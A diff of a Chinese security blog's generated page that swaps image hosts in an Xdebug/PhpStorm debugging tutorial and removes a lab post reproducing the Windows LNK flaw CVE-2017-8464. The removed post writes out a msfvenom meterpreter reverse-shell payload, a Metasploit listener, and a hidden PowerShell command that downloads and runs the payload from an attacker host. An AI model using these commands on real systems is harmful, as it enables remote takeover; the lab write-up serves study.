class="line">xdebug.remote_enable = On</span><br><span class="line">;启用性能检测分析</span><br><span class="line">xdebug.profiler_enable = On</span><br><span class="line">;启用代码自动跟踪</span><br><span class="line">xdebug.auto_trace=On</span><br><span class="line">xdebug.profiler_enable_trigger = On</span><br><span class="line">xdebug.profiler_output_name = cachegrind.out.%t.%p</span><br><span class="line"></span><br><span class="line">;如果配置该项就不需要配xdebug.remote_host</span><br><span class="line">xdebug.remote_connect_back=1</span><br><span class="line"></span><br><span class="line">;配置端口和监听的域名</span><br><span class="line">xdebug.remote_port=9101</span><br><span class="line"></span><br><span class="line">;xdebug.remote_host=&quot;localhost&quot;</span><br><span class="line">;配置id key</span><br><span class="line">xdebug.idekey= &quot;360college&quot;</span><br></pre></td></tr></table></figure>
-<h4 id="2、-PhpStorm配置"><a href="#2、-PhpStorm配置" class="headerlink" title="2、 PhpStorm配置"></a>2、 PhpStorm配置</h4><h4 id="（1）SFTP同步代码"><a href="#（1）SFTP同步代码" class="headerlink" title="（1）SFTP同步代码"></a>（1）SFTP同步代码</h4><p><img src="http://wfwewefw.yuxuni.cn/blog/180804/6ej12BDa8K.png?imageslim" alt="mark"></p>
+<h4 id="2、-PhpStorm配置"><a href="#2、-PhpStorm配置" class="headerlink" title="2、 PhpStorm配置"></a>2、 PhpStorm配置</h4><h4 id="（1）SFTP同步代码"><a href="#（1）SFTP同步代码" class="headerlink" title="（1）SFTP同步代码"></a>（1）SFTP同步代码</h4><p><img src="http://pn49yk1z4.bkt.clouddn.com/180804/6ej12BDa8K.png?imageslim" alt="mark"></p>
 <p>通过FTP/SFTP/FTPS下载服务器需要调试的代码，按照下图提示，下一步下一步进行配置。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180804/l7cd8HJGkE.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180804/l7cd8HJGkE.png?imageslim" alt="mark"></p>
 <p>创建新的工程，工程名字根据需求填写。选择工程的目录路径。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180804/FmIEJDjjdC.png?imageslim" alt="mark"></p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180804/LJECCJlmi2.png?imageslim" alt="mark"></p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180804/4gBj8B1Cgd.png?imageslim" alt="mark"></p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180804/946hcD1fcK.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180804/FmIEJDjjdC.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180804/LJECCJlmi2.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180804/4gBj8B1Cgd.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180804/946hcD1fcK.png?imageslim" alt="mark"></p>
 <p>看到正在下载代码。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180804/BgaDBa9jdm.png?imageslim" alt="mark"></p>
-<h4 id="（2）配置-Debug"><a href="#（2）配置-Debug" class="headerlink" title="（2）配置 Debug"></a>（2）配置 Debug</h4><p><img src="http://wfwewefw.yuxuni.cn/blog/180804/0hK31AGab6.png?imageslim" alt="mark"></p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180804/4DImBIa2bI.png?imageslim" alt="mark"></p>
-<h4 id="（2）配置-Server"><a href="#（2）配置-Server" class="headerlink" title="（2）配置 Server"></a>（2）配置 Server</h4><p><img src="http://wfwewefw.yuxuni.cn/blog/180804/Fi332d1jB7.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180804/BgaDBa9jdm.png?imageslim" alt="mark"></p>
+<h4 id="（2）配置-Debug"><a href="#（2）配置-Debug" class="headerlink" title="（2）配置 Debug"></a>（2）配置 Debug</h4><p><img src="http://pn49yk1z4.bkt.clouddn.com/180804/0hK31AGab6.png?imageslim" alt="mark"></p>
+<p><img src="http://pn49yk1z4.bkt.clouddn.com/180804/4DImBIa2bI.png?imageslim" alt="mark"></p>
+<h4 id="（2）配置-Server"><a href="#（2）配置-Server" class="headerlink" title="（2）配置 Server"></a>（2）配置 Server</h4><p><img src="http://pn49yk1z4.bkt.clouddn.com/180804/Fi332d1jB7.png?imageslim" alt="mark"></p>
 <h4 id="（5）配置调试选项-1"><a href="#（5）配置调试选项-1" class="headerlink" title="（5）配置调试选项"></a>（5）配置调试选项</h4><p>待补充。</p>
 <h4 id="（6）开始调试-1"><a href="#（6）开始调试-1" class="headerlink" title="（6）开始调试"></a>（6）开始调试</h4><p>待补充。</p>
 
@@ -2125,87 +2211,6 @@
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
-    <article id="post-Windows远程命令执行漏洞（震网漏洞）-CVE-2017-8464"  class="article article-type-post" itemscope itemprop="blogPost" >
-  <div id="articleInner" class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 class="thumb" itemprop="name">
-      <a class="article-title" href="/2017/10/15/Windows远程命令执行漏洞（震网漏洞）-CVE-2017-8464/">Windows远程命令执行漏洞（震网漏洞）-CVE-2017-8464</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-meta">
-      
-	<a href="/2017/10/15/Windows远程命令执行漏洞（震网漏洞）-CVE-2017-8464/" class="article-date">
-	  <time datetime="2017-10-15T09:52:08.000Z" itemprop="datePublished">2017-10-15</time>
-	</a>
-
-      
-      
-    </div>
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Windows远程命令执行漏洞-震网三代漏洞（CVE-2017-8464）"><a href="#Windows远程命令执行漏洞-震网三代漏洞（CVE-2017-8464）" class="headerlink" title="Windows远程命令执行漏洞-震网三代漏洞（CVE-2017-8464）"></a>Windows远程命令执行漏洞-震网三代漏洞（CVE-2017-8464）</h1><h2 id="漏洞实验原理"><a href="#漏洞实验原理" class="headerlink" title="漏洞实验原理"></a>漏洞实验原理</h2><p>&emsp;&emsp;攻击者可以向用户呈现包含恶意的.LNK文件和相关联的恶意二进制文件的可移动驱动器或远程共享。 当用户在Windows资源管理器或解析.LNK文件的任何其他应用程序中打开此驱动器（或远程共享）时，恶意二进制程序将在目标系统上执行攻击者选择的代码，成功利用此漏洞的攻击者可以获得与本地用户相同的用户权限。 注释:.LNK是windows系统内应用程序快捷方式文件的文件类型后缀名 。震网三代”LNK文件远程代码执行漏洞（CVE-2017-8464）可以用于穿透物理隔离网络。 </p>
-<p><strong>漏洞影响范围:</strong></p>
-<p>Windows 7</p>
-<p>Windows 8.1</p>
-<p>Windows RT 8.1</p>
-<p>Windows 10</p>
-<p>Windows Server 2008</p>
-<p>Windows Server 2008 R2</p>
-<p>Windows Server 2012</p>
-<p>Windows Server 2012 R2</p>
-<p>Windows Server 2016</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="第一步-漏洞验证"><a href="#第一步-漏洞验证" class="headerlink" title="第一步 漏洞验证"></a>第一步 漏洞验证</h3><p>msfvenom生成 powershell对应payload。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom  -p  windows/x64/meterpreter/reverse_tcp lhost=192.168.0.11 [攻击机IP地址] -f  psh-reflection&gt;payload.ps1</span><br></pre></td></tr></table></figure>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180729/hi5gLDca4i.png?imageslim" alt="mark"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180729/KLFj78D5ba.png?imageslim" alt="mark"></p>
-<p>输入密码360College</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mv payload.ps1 /var/www/html</span><br></pre></td></tr></table></figure>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180729/g7cafhlcdk.png?imageslim" alt="mark"></p>
-<p>启动apache服务器。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br><span class="line"></span><br><span class="line">service apache2 status</span><br></pre></td></tr></table></figure>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180729/bEkG291m2d.png?imageslim" alt="mark"></p>
-<h3 id="第二步-msf监听"><a href="#第二步-msf监听" class="headerlink" title="第二步 msf监听"></a>第二步 msf监听</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost  192.168.0.11 [攻击机IP地址]</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180729/Fc0Dm9L1m7.png?imageslim" alt="mark"></p>
-<h3 id="第三步-靶机上钩"><a href="#第三步-靶机上钩" class="headerlink" title="第三步 靶机上钩"></a>第三步 靶机上钩</h3><p>登录靶机，在靶机上验证。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180729/E1I8B7e4e7.png?imageslim" alt="mark"></p>
-<p>在靶机桌面上新建快捷方式 ，插入对象的位置：</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180729/6dCd9I6i4l.png?imageslim" alt="mark"></p>
-<p>插入以下代码。</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180729/k36iJkcHFg.png?imageslim" alt="mark"></p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -windowstyle hidden -exec bypass -c <span class="string">"IEX (New-Object Net.WebClient).DownloadString(‘http://192.168.0.11/payload.ps1‘);test.ps1"</span></span><br></pre></td></tr></table></figure>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180729/CJEELCB4cB.png?imageslim" alt="mark"></p>
-<p>再点击完成。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload.exe</span><br></pre></td></tr></table></figure>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180729/g2hbh5Ic7I.png?imageslim" alt="mark"></p>
-<p>点击payload.exe。</p>
-<p>在攻击机上可看到漏洞利用成功：</p>
-<p><img src="http://wfwewefw.yuxuni.cn/blog/180729/g2DeG2Lf3k.png?imageslim" alt="mark"></p>
-<p>m</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞复现/">漏洞复现</a></li></ul>
 
     </footer>
   </div>
@@ -2234,7 +2239,7 @@
   <div class="container">
       	<div class="row">
 	      <p> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/iTimeTraveler/hexo-theme-hiker" target="_blank">Hexo-theme-hiker</a> </p>
-	      <p id="copyRightEn">Copyright &copy; 2016 - 2018 shackle All Rights Reserved.</p>
+	      <p id="copyRightEn">Copyright &copy; 2016 - 2019 shackle All Rights Reserved.</p>
 	      
 	      
     		<p class="busuanzi_uv">
@@ -2384,7 +2389,7 @@
             shackle
           </div>
           <div class="panel-body">
-            Copyright © 2018 shackle All Rights Reserved.
+            Copyright © 2019 shackle All Rights Reserved.
           </div>
         </div>
       </div>
